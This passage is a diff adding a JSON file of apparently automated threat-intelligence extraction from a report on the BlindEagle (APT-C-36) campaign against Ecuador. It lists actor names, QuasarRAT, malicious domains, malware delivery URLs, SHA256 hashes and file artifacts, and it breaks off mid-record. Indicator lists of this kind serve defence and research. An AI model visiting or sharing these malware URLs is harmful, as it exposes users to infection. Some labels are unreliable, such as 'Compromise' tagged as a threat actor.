@@ -1,0 +1,1821 @@
+{
+  "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+  "title": "BlindEagle Targeting Ecuador With Sharpened Tools",
+  "source": null,
+  "published_date": "January 5, 2023",
+  "report_metadata": {
+    "file_name": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023).pdf",
+    "file_path": "/root/APTtext/Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023).pdf",
+    "source_type": "pdf",
+    "char_length": 13761,
+    "report_profile": "narrative_cti"
+  },
+  "entities": [
+    {
+      "id": "ent_threatactor_APT-C-36",
+      "type": "ThreatActor",
+      "name": "APT-C-36",
+      "normalized_name": "APT-C-36",
+      "aliases": [
+        "Blind Eagle"
+      ],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_1",
+        "ev_37",
+        "ev_39",
+        "ev_4"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_1",
+      "supporting_evidence_ids": [
+        "ev_39",
+        "ev_4",
+        "ev_37"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_QuasarRAT",
+      "type": "Malware",
+      "name": "QuasarRAT",
+      "normalized_name": "QuasarRAT",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_10",
+        "ev_13"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "family": "QuasarRAT",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_13",
+      "supporting_evidence_ids": [
+        "ev_10"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_domain_gtly.to",
+      "type": "Domain",
+      "name": "gtly.to",
+      "normalized_name": "gtly.to",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_43",
+        "ev_67",
+        "ev_68",
+        "ev_69"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "gtly.to",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_43",
+      "supporting_evidence_ids": [
+        "ev_67",
+        "ev_68",
+        "ev_69"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_victim_Ecuador",
+      "type": "Victim",
+      "name": "Ecuador",
+      "normalized_name": "Ecuador",
+      "aliases": [],
+      "confidence": 0.88,
+      "evidence_ids": [
+        "ev_17",
+        "ev_18",
+        "ev_19",
+        "ev_39"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": "ev_17",
+      "supporting_evidence_ids": [
+        "ev_18",
+        "ev_19",
+        "ev_39"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    }
+  ],
+  "observations": [
+    {
+      "id": "ent_threatactor_Blind_Eagle",
+      "type": "ThreatActor",
+      "name": "Blind Eagle",
+      "normalized_name": "Blind Eagle",
+      "aliases": [],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_1",
+        "ev_37",
+        "ev_39",
+        "ev_4"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_1",
+      "supporting_evidence_ids": [
+        "ev_39",
+        "ev_4",
+        "ev_37"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "alias_mention",
+      "alias_for": "ent_threatactor_APT-C-36"
+    },
+    {
+      "id": "ent_threatactor_Compromise",
+      "type": "ThreatActor",
+      "name": "Compromise",
+      "normalized_name": "Compromise",
+      "aliases": [
+        "IoCs"
+      ],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_42"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_42",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_tool_ActivarRDP",
+      "type": "Tool",
+      "name": "ActivarRDP",
+      "normalized_name": "ActivarRDP",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_16"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_16",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "tool_name": "ActivarRDP",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_campaign_Blind_Eagle_s_campaign_targeting_Ecuador",
+      "type": "Campaign",
+      "name": "Blind Eagle's campaign targeting Ecuador",
+      "normalized_name": "Blind Eagle's campaign targeting Ecuador",
+      "aliases": [],
+      "confidence": 0.9,
+      "evidence_ids": [],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": null,
+      "supporting_evidence_ids": [],
+      "needs_review": true,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_domain_laminascol.linkpc.net",
+      "type": "Domain",
+      "name": "laminascol.linkpc.net",
+      "normalized_name": "laminascol.linkpc.net",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_78",
+        "ev_79"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "laminascol.linkpc.net",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_78",
+      "supporting_evidence_ids": [
+        "ev_79"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_systemwin.linkpc.net",
+      "type": "Domain",
+      "name": "systemwin.linkpc.net",
+      "normalized_name": "systemwin.linkpc.net",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_79"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "systemwin.linkpc.net",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_79",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_upxsystems.com",
+      "type": "Domain",
+      "name": "upxsystems.com",
+      "normalized_name": "upxsystems.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_22",
+        "ev_26"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "upxsystems.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_22",
+      "supporting_evidence_ids": [
+        "ev_26"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "profile_demoted"
+    },
+    {
+      "id": "ent_domain_www.mediafire.com",
+      "type": "Domain",
+      "name": "www.mediafire.com",
+      "normalized_name": "www.mediafire.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_80",
+        "ev_81"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "www.mediafire.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_80",
+      "supporting_evidence_ids": [
+        "ev_81"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_url_https_gtly.to_cuOv3gNDi",
+      "type": "URL",
+      "name": "https://gtly.to/cuOv3gNDi",
+      "normalized_name": "https://gtly.to/cuOv3gNDi",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_43",
+        "ev_67",
+        "ev_68",
+        "ev_69"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "https://gtly.to/cuOv3gNDi",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_43",
+      "supporting_evidence_ids": [
+        "ev_68",
+        "ev_67",
+        "ev_69"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "profile_demoted"
+    },
+    {
+      "id": "ent_url_https_gtly.to_dGBeBqd8z",
+      "type": "URL",
+      "name": "https://gtly.to/dGBeBqd8z",
+      "normalized_name": "https://gtly.to/dGBeBqd8z",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_43",
+        "ev_67",
+        "ev_68",
+        "ev_69"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "https://gtly.to/dGBeBqd8z",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_43",
+      "supporting_evidence_ids": [
+        "ev_69",
+        "ev_67",
+        "ev_68"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "profile_demoted"
+    },
+    {
+      "id": "ent_url_https_gtly.to_QvlFV_zgh",
+      "type": "URL",
+      "name": "https://gtly.to/QvlFV_zgh",
+      "normalized_name": "https://gtly.to/QvlFV_zgh",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_43",
+        "ev_67",
+        "ev_68",
+        "ev_69"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "https://gtly.to/QvlFV_zgh",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_43",
+      "supporting_evidence_ids": [
+        "ev_67",
+        "ev_68",
+        "ev_69"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "profile_demoted"
+    },
+    {
+      "id": "ent_url_https_www.mediafire.com_file_cfnw8rwufptk5jz_migracioncolombiaprocesopendienteid2036521045875referenciawwwmigraciongovco.LHA_file",
+      "type": "URL",
+      "name": "https://www.mediafire.com/file/cfnw8rwufptk5jz/migracioncolombiaprocesopendienteid2036521045875referenciawwwmigraciongovco.LHA/file",
+      "normalized_name": "https://www.mediafire.com/file/cfnw8rwufptk5jz/migracioncolombiaprocesopendienteid2036521045875referenciawwwmigraciongovco.LHA/file",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_80"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "https://www.mediafire.com/file/cfnw8rwufptk5jz/migracioncolombiaprocesopendienteid2036521045875referenciawwwmigraciongovco.LHA/file",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_80",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_ioc_sha256_10fd1b81c5774c1cc6c00cc06b3ed181b2d78191c58b8e9b54fa302e4990b13d",
+      "type": "SHA256",
+      "name": "10fd1b81c5774c1cc6c00cc06b3ed181b2d78191c58b8e9b54fa302e4990b13d",
+      "normalized_name": "10fd1b81c5774c1cc6c00cc06b3ed181b2d78191c58b8e9b54fa302e4990b13d",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_75"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "10fd1b81c5774c1cc6c00cc06b3ed181b2d78191c58b8e9b54fa302e4990b13d",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_75",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_2702ea04dcbbbc3341eeffb494b692e15a50fbd264b1d676b56242aae3dd9001",
+      "type": "SHA256",
+      "name": "2702ea04dcbbbc3341eeffb494b692e15a50fbd264b1d676b56242aae3dd9001",
+      "normalized_name": "2702ea04dcbbbc3341eeffb494b692e15a50fbd264b1d676b56242aae3dd9001",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_63"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "2702ea04dcbbbc3341eeffb494b692e15a50fbd264b1d676b56242aae3dd9001",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_63",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_353406209dea860decac0363d590096e2a8717dd37d6b4d8b0272b02ad82472e",
+      "type": "SHA256",
+      "name": "353406209dea860decac0363d590096e2a8717dd37d6b4d8b0272b02ad82472e",
+      "normalized_name": "353406209dea860decac0363d590096e2a8717dd37d6b4d8b0272b02ad82472e",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_71"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "353406209dea860decac0363d590096e2a8717dd37d6b4d8b0272b02ad82472e",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_71",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_46addee80c4c882b8a6903cced9b6c0130ec327ae8a59c5946bb954ccea64a12",
+      "type": "SHA256",
+      "name": "46addee80c4c882b8a6903cced9b6c0130ec327ae8a59c5946bb954ccea64a12",
+      "normalized_name": "46addee80c4c882b8a6903cced9b6c0130ec327ae8a59c5946bb954ccea64a12",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_73"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "46addee80c4c882b8a6903cced9b6c0130ec327ae8a59c5946bb954ccea64a12",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_73",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_61685ea4dc4ca4d01e0513d5e23ee04fc9758d6b189325b34d5b16da254cc9f4",
+      "type": "SHA256",
+      "name": "61685ea4dc4ca4d01e0513d5e23ee04fc9758d6b189325b34d5b16da254cc9f4",
+      "normalized_name": "61685ea4dc4ca4d01e0513d5e23ee04fc9758d6b189325b34d5b16da254cc9f4",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_66"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "61685ea4dc4ca4d01e0513d5e23ee04fc9758d6b189325b34d5b16da254cc9f4",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_66",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_68af317ffde8639edf2562481912161cf398f0edba6e06745d90c1359554c76e",
+      "type": "SHA256",
+      "name": "68af317ffde8639edf2562481912161cf398f0edba6e06745d90c1359554c76e",
+      "normalized_name": "68af317ffde8639edf2562481912161cf398f0edba6e06745d90c1359554c76e",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_65"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "68af317ffde8639edf2562481912161cf398f0edba6e06745d90c1359554c76e",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_65",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_8e864940a97206705b29e645a2c2402c2192858357205213567838443572f564",
+      "type": "SHA256",
+      "name": "8e864940a97206705b29e645a2c2402c2192858357205213567838443572f564",
+      "normalized_name": "8e864940a97206705b29e645a2c2402c2192858357205213567838443572f564",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_62"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "8e864940a97206705b29e645a2c2402c2192858357205213567838443572f564",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_62",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_a03259900d4b095d7494944c50d24115c99c54f3c930bea08a43a8f0a1da5a2e",
+      "type": "SHA256",
+      "name": "a03259900d4b095d7494944c50d24115c99c54f3c930bea08a43a8f0a1da5a2e",
+      "normalized_name": "a03259900d4b095d7494944c50d24115c99c54f3c930bea08a43a8f0a1da5a2e",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_72"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "a03259900d4b095d7494944c50d24115c99c54f3c930bea08a43a8f0a1da5a2e",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_72",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_ac1ea54f35fe9107af1aef370e4de4dc504c8523ddaae10d95beae5a3bf67716",
+      "type": "SHA256",
+      "name": "ac1ea54f35fe9107af1aef370e4de4dc504c8523ddaae10d95beae5a3bf67716",
+      "normalized_name": "ac1ea54f35fe9107af1aef370e4de4dc504c8523ddaae10d95beae5a3bf67716",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_77"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "ac1ea54f35fe9107af1aef370e4de4dc504c8523ddaae10d95beae5a3bf67716",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_77",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_c067869ac346d007a17e2e91c1e04ca0f980e8e9c4fd5c7baa0cb0cc2398fe59",
+      "type": "SHA256",
+      "name": "c067869ac346d007a17e2e91c1e04ca0f980e8e9c4fd5c7baa0cb0cc2398fe59",
+      "normalized_name": "c067869ac346d007a17e2e91c1e04ca0f980e8e9c4fd5c7baa0cb0cc2398fe59",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_74"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "c067869ac346d007a17e2e91c1e04ca0f980e8e9c4fd5c7baa0cb0cc2398fe59",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_74",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_c4ff3fb6a02ca0e51464b1ba161c0a7387b405c78ead528a645d08ad3e696b12",
+      "type": "SHA256",
+      "name": "c4ff3fb6a02ca0e51464b1ba161c0a7387b405c78ead528a645d08ad3e696b12",
+      "normalized_name": "c4ff3fb6a02ca0e51464b1ba161c0a7387b405c78ead528a645d08ad3e696b12",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_76"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "c4ff3fb6a02ca0e51464b1ba161c0a7387b405c78ead528a645d08ad3e696b12",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_76",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_c63d15fe69a76186e4049960337d8c04c6230e4c2d3d3164d3531674f5f74cdf",
+      "type": "SHA256",
+      "name": "c63d15fe69a76186e4049960337d8c04c6230e4c2d3d3164d3531674f5f74cdf",
+      "normalized_name": "c63d15fe69a76186e4049960337d8c04c6230e4c2d3d3164d3531674f5f74cdf",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_70"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "c63d15fe69a76186e4049960337d8c04c6230e4c2d3d3164d3531674f5f74cdf",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_70",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_f80eb2fcefb648f5449c618e83c4261f977b18b979aacac2b318a47e99c19f64",
+      "type": "SHA256",
+      "name": "f80eb2fcefb648f5449c618e83c4261f977b18b979aacac2b318a47e99c19f64",
+      "normalized_name": "f80eb2fcefb648f5449c618e83c4261f977b18b979aacac2b318a47e99c19f64",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_64"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "value": "f80eb2fcefb648f5449c618e83c4261f977b18b979aacac2b318a47e99c19f64",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_64",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_file_os.sys",
+      "type": "File",
+      "name": "os.sys",
+      "normalized_name": "os.sys",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_21"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "file_name": "os.sys",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_21",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "family_hints": [
+        "HTML"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_powershell.exe",
+      "type": "File",
+      "name": "powershell.exe",
+      "normalized_name": "powershell.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_48"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "file_name": "powershell.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_48",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_py.zip",
+      "type": "File",
+      "name": "py.zip",
+      "normalized_name": "py.zip",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_53",
+        "ev_56",
+        "ev_57"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "file_name": "py.zip",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_53",
+      "supporting_evidence_ids": [
+        "ev_56",
+        "ev_57"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "family_hints": [
+        "PUBLIC"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_python-3.9.9-embed-win32.zip",
+      "type": "File",
+      "name": "python-3.9.9-embed-win32.zip",
+      "normalized_name": "python-3.9.9-embed-win32.zip",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_52"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "file_name": "python-3.9.9-embed-win32.zip",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_52",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_python.exe",
+      "type": "File",
+      "name": "python.exe",
+      "normalized_name": "python.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_23",
+        "ev_58",
+        "ev_59",
+        "ev_60"
+      ],
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "file_name": "python.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_60",
+      "supporting_evidence_ids": [
+        "ev_58",
+        "ev_59",
+        "ev_23"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "family_hints": [
+        "PUBLIC",
+        "HKCU"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    }
+  ],
+  "relations": [
+    {
+      "id": "rel_0001",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "type": "alias_of",
+      "head_id": "ent_threatactor_Blind_Eagle",
+      "tail_id": "ent_threatactor_APT-C-36",
+      "head_type": "ThreatActor",
+      "tail_type": "ThreatActor",
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_1",
+        "ev_37"
+      ],
+      "primary_evidence_id": "ev_1",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
